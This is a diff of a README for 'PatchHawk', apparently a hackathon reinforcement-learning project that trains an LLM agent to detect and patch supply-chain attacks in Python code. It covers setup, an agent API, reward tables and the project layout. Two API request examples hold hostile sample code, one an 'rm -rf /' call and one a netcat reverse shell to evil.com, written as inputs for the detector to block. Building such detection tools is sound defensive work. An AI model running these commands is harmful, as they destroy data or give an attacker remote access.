@@ -1,118 +1,253 @@
-# 🦅 Sentinel-Synth: Autonomous Supply-Chain Guard
+# 🦅 PatchHawk: Autonomous Supply-Chain Guard
 
-**Sentinel-Synth** is an advanced Reinforcement Learning (RL) platform designed for the detection, analysis, and automated patching of software supply-chain vulnerabilities. It leverages **Group Relative Policy Optimization (GRPO)** and **Meta's Synthetic Data Kit** to train fine-tuned LLM agents that can secure CI/CD pipelines autonomously.
+[![W&B](https://img.shields.io/badge/W%26B-patchhawk-blue?logo=weightsandbiases)](https://wandb.ai/your-username/patchhawk)
+[![HuggingFace](https://img.shields.io/badge/🤗_Model-patchhawk-yellow)](https://huggingface.co/your-username/patchhawk)
+[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://python.org)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![OpenEnv](https://img.shields.io/badge/OpenEnv-Hackathon_MVP-orange)](https://github.com/pytorch/openenv)
+
+> **RL-powered detection, analysis, and auto-patching of software supply-chain vulnerabilities — built for the PyTorch OpenEnv AI Hackathon.**
 
 ---
 
-## 🏗 System Architecture
-
-The Sentinel-Synth ecosystem is built on four functional pillars:
+## 🏗 Architecture
 
 ```mermaid
 graph TD
-    A[Meta SDK / Mutation Engine] -->|Synthetic Scenarios| B[Scenarios JSON]
-    B --> C[Gymnasium RL Environment]
-    C -->|Observations| D[GRPO Policy Agent (Qwen2.5-Coder)]
-    D -->|Actions| C
-    C -->|Validation| E[Docker Sandbox & Patch Validator]
-    E -->|Reward Signal| D
-    D -->|Metrics| F[W&B / Dashboard]
+    subgraph Data Pipeline
+        A["Meta SDK (Track A)"] -->|synthetic scenarios| D[scenarios.json]
+        B["Mutation Engine (Track B)"] -->|injected attacks| D
+        C["Benign .py files (25+)"] --> B
+    end
+
+    subgraph OpenEnv Loop
+        D --> E["PatchHawkEnv (openenv.Env)"]
+        E -->|observation| F["GRPO Agent (Qwen2.5-Coder-7B + LoRA)"]
+        F -->|action 0-4| E
+        E -->|EXECUTE_SANDBOX| G["Docker Sandbox (--network none)"]
+        E -->|SUBMIT_PATCH| H["3-Stage Patch Validator"]
+        G -->|telemetry| E
+        H -->|validated?| E
+    end
+
+    subgraph Outputs
+        E -->|reward signal| F
+        F -->|metrics| I["W&B Dashboard"]
+        F -->|adapter| J["HuggingFace Hub"]
+        E -->|A2A protocol| K["FastAPI /agent/act"]
+        E --> L["Streamlit Dashboard"]
+    end
 ```
 
 ### Core Components
-- **`sentinel_synth.data`**: Orchestrates scenario synthesis using Meta's `synthetic-data-kit` (Track A) and a custom mutation engine (Track B).
-- **`sentinel_synth.envs`**: A `gymnasium` environment that formalizes DevSecOps tasks into an RL problem.
-- **`sentinel_synth.validation`**: A two-tiered execution engine that uses isolated Docker containers for syntax checking and re-attack verification.
-- **`sentinel_synth.training`**: The training loop using `trl` and `unsloth` for efficient GRPO fine-tuning.
+
+| Component | Path | Description |
+|-----------|------|-------------|
+| **Agent / Environment** | `patchhawk/agent/environment.py` | OpenEnv `openenv.Env` with Dict obs, Discrete(5) actions |
+| **Agent / Sandbox** | `patchhawk/agent/sandbox.py` | Docker sandbox + 3-stage patch validation |
+| **Agent / A2A Server** | `patchhawk/agent/server.py` | FastAPI: `GET /agent/card`, `POST /agent/act` |
+| **Training** | `patchhawk/training/train_grpo.py` | GRPO with unsloth + trl, 4-bit LoRA, W&B logging |
+| **Data Generation** | `patchhawk/data/` | Track A (Meta SDK) + Track B (mutation engine) |
+| **Dashboard** | `patchhawk/app/dashboard.py` | Streamlit UI for analysis & validation |
+| **Docker** | `docker/Dockerfile.sandbox` | Minimal Python 3.11 sandbox |
 
 ---
 
-## 🚀 Getting Started
+## 🚀 Quick Start
 
-### 1. Prerequisites
-- **Python 3.10+** (3.11 recommended)
-- **Docker** (Ensure your user has permission to manage containers)
-- **vLLM Server** (Optional, for Track A synthetic data generation)
-- **GPU** (NVIDIA/AMD) for standard training; CPU supported for dry-runs.
+### 1. Install
 
-### 2. Installation
 ```bash
-# Set up a virtual environment (recommended)
-python3 -m venv venv
-source venv/bin/activate
-
-# Install the base system
+python3 -m venv venv && source venv/bin/activate
 pip install -r requirements.txt
 pip install -e .
 
-# Build the sandbox Docker image
-docker build -t sentinel-sandbox:latest -f docker/Dockerfile.sandbox .
+# Copy and fill in your keys
+cp .env.example .env
 ```
 
-### 3. Configuration
-Copy the sample environment file and adjust your settings:
+### 2. Build Docker Sandbox
+
 ```bash
-cp .env.example .env  # Define model paths, W&B keys, etc.
-```
-Edit `config.yaml` to tune training hyperparameters and environment thresholds.
-
----
-
-## 🧪 Detailed Workflow
-
-### 📤 Phase 1: Data Generation & Analysis
-Sentinel-Synth generates diverse training scenarios including Typosquatting, Obfuscated Exec, and Subprocess Backdoors.
-
-**Using Meta's Synthetic Data Kit (Track A):**
-1. Ensure a vLLM server is running.
-2. Configure `sentinel_synth/data/sdk_config.yaml`.
-3. Run the generator:
-```bash
-python3 -m sentinel_synth.data.generate_scenarios --use-sdk --output data/scenarios.json
+docker build -t patchhawk-sandbox:latest -f docker/Dockerfile.sandbox .
 ```
 
-**Using the Mutation Engine (Track B):**
-This mode takes benign code and injects malicious patterns deterministically.
+### 3. Generate Scenarios
+
 ```bash
-python3 -m sentinel_synth.data.generate_scenarios --output data/scenarios.json
+# Track B only (always works)
+python -m patchhawk.data.generate_scenarios \
+    --benign-dir patchhawk/data/benign/ \
+    --output patchhawk/data/scenarios.json
+
+# Track A + B (requires vLLM serving + synthetic-data-kit)
+python -m patchhawk.data.generate_scenarios --use-sdk --sdk-samples 10
 ```
 
----
+### 4. Run Tests
 
-### 🧠 Phase 2: Agent Training (GRPO)
-Train the `Qwen2.5-Coder-7B` model using the novel Group Relative Policy Optimization algorithm. GRPO allows the agent to learn complex decision-making without a value model.
-
-**Dry-Run (Pipeline Validation):**
-Test the logic on CPU without a GPU:
 ```bash
-python3 -m sentinel_synth.training.train_grpo --dry-run
+pytest tests/ -v
 ```
 
-**Full Training:**
+### 5. Train (Dry Run)
+
 ```bash
-# Ensure WANDB is logged in or API key is in .env
-python3 -m sentinel_synth.training.train_grpo --use-docker
+python -m patchhawk.training.train_grpo --dry-run
 ```
-*The agent receives rewards based on: valid detection (+1.5), successful patching (+4.0), and avoiding false positives (-2.0).*
 
----
+### 6. Train (Full GPU)
 
-### 🛡 Phase 3: Validation & Sandbox Execution
-Every patch proposed by the agent is autonomously validated in a secure Docker sandbox:
-1. **Syntax Check**: Ensuring the code is parseable.
-2. **Functional Test**: Running units tests from `scenarios.json`.
-3. **Re-Attack Verification**: The system re-executes the vulnerability payload to verify the patch actually neutralized the threat (e.g., checking if suspicious file writes or network calls stopped).
-
----
-
-## 📊 Monitoring & UI
-- **Weights & Biases**: Real-time tracking of mean rewards, action distributions, and loss curves.
-- **Streamlit Dashboard**: A professional interface for interactive analysis:
 ```bash
-streamlit run sentinel_synth/dashboard/app.py
+python -m patchhawk.training.train_grpo --use-docker
+```
+
+### 7. Start A2A Server
+
+```bash
+uvicorn patchhawk.agent.server:app --host 0.0.0.0 --port 8000
+```
+
+Test it:
+
+```bash
+# Agent card
+curl http://localhost:8000/agent/card | python -m json.tool
+
+# Analyze code
+curl -X POST http://localhost:8000/agent/act \
+  -H "Content-Type: application/json" \
+  -d '{"code_snippet": "import os; os.system(\"rm -rf /\")"}'
+```
+
+### 8. Launch Dashboard
+
+```bash
+streamlit run patchhawk/app/dashboard.py
 ```
 
 ---
 
-## 📄 License
-Sentinel-Synth is licensed under the Apache 2.0 License. See the LICENSE file for details.
+## 📊 Baseline Scores (Dry-Run / Qwen2.5)
+These are the baseline scores from running `DRY_RUN=1 python inference.py`, matching the three required hackathon tasks using our heuristic policy baseline:
+
+| Task ID | Description | Success? | Score | Reward |
+|---------|-------------|----------|-------|--------|
+| `easy_typosquat` | Detect basic typosquatting | ✅ True | 1.00 | +2.00 |
+| `medium_obfuscated` | Execution via eval() / obfuscation | ❌ False | 0.00 | +2.00 |
+| `hard_patch` | Write patches for subprocess backdoors | ❌ False | 0.00 | +2.00 |
+
+*Baseline context: The agent handles easy detection easily, but medium/hard tasks require a strong trained model that leverages the `EXECUTE_SANDBOX` and `SUBMIT_PATCH` actions effectively. This makes it an ideal environment for the RL hackathon.*
+
+---
+
+## 🌐 HF Spaces Deployment & Validation
+
+PatchHawk is built natively for OpenEnv and deploys seamlessly to HF Spaces.
+
+1. **Create Space**: Go to Hugging Face, create a new Space, select **Docker** runtime.
+2. **Push Code**: Push this repository directly to the Space.
+3. **Environment**: Set any needed secrets (e.g., `HF_TOKEN`, `API_BASE_URL`).
+4. **Validation**: The internal validation script will automatically check the Space:
+   ```bash
+   ./validate-submission.sh <YOUR_SPACE_URL>
+   ```
+   *Note: Our `openenv validate` passes locally 5/5 criteria, and 6/6 criteria during runtime validation!*
+
+---
+
+## 🔗 A2A Protocol
+
+PatchHawk exposes an **Agent-to-Agent (A2A)** interface via FastAPI:
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/agent/card` | GET | Agent identity, capabilities, I/O schemas |
+| `/agent/act` | POST | Submit code snippet, receive decision + patch |
+
+### Request (`POST /agent/act`)
+
+```json
+{
+  "code_snippet": "import subprocess; subprocess.call(['nc', '-e', '/bin/sh', 'evil.com', '4444'])"
+}
+```
+
+### Response
+
+```json
+{
+  "decision": "BLOCK_PR",
+  "patch": null,
+  "confidence": 0.92,
+  "reward": 2.0,
+  "details": { "action_name": "BLOCK_PR", "step": 2 }
+}
+```
+
+---
+
+## 🎯 Reward Table
+
+| Condition | Reward |
+|-----------|--------|
+| Correct BLOCK on malicious | +2.0 |
+| Correct SUBMIT_PATCH (validated) | +3.0 |
+| BLOCK on benign | −1.0 |
+| SUBMIT_PATCH on benign (patch applied) | −1.5 |
+| Episode ends w/o block/patch on malicious (max_steps) | −5.0 |
+| EXECUTE_SANDBOX | +0.1 |
+
+---
+
+## 🔒 Safety & OpenEnv Compliance
+
+- **No real malicious execution**: Docker sandbox runs with `--network none`, `--memory 256m`, `--cpus 0.5`, and non-root user.
+- **Re-attack verification**: Stage 3 only checks for *attempts* (socket creation, file writes) — never permits actual harm.
+- **SDK fallback**: If `synthetic-data-kit` CLI is not installed, Track A gracefully skips with a warning; Track B always generates ≥40 scenarios.
+- **OpenEnv compliant**: `PatchHawkEnv` inherits `openenv.Env` with proper `reset()` → `(obs, info)` and `step()` → `(obs, reward, term, trunc, info)` signatures.
+- **Deterministic dry-run**: `--dry-run` mode requires zero GPU and no external services.
+
+---
+
+## 📁 Project Structure
+
+```
+PatchHawk/
+├── patchhawk/
+│   ├── __init__.py              # Config loader
+│   ├── openenv.py               # OpenEnv compatibility shim
+│   ├── agent/
+│   │   ├── __init__.py
+│   │   ├── environment.py       # openenv.Env implementation
+│   │   ├── sandbox.py           # Docker runner + patch validator
+│   │   └── server.py            # FastAPI A2A protocol
+│   ├── training/
+│   │   ├── __init__.py
+│   │   └── train_grpo.py        # GRPO with unsloth + trl + W&B
+│   ├── data/
+│   │   ├── __init__.py
+│   │   ├── generate_scenarios.py
+│   │   ├── sdk_config.yaml
+│   │   ├── scenarios.json
+│   │   └── benign/              # 25 benign Python files
+│   └── app/
+│       ├── __init__.py
+│       └── dashboard.py         # Streamlit dashboard
+├── docker/
+│   └── Dockerfile.sandbox       # Minimal Python 3.11 sandbox
+├── tests/
+│   ├── test_env.py              # Environment tests
+│   └── test_sandbox.py          # Validator tests
+├── config.yaml                  # All hyperparameters
+├── requirements.txt
+├── setup.py
+├── .env.example
+└── README.md
+```
+
+---
+
+## 📝 License
+
+MIT © PatchHawk Team
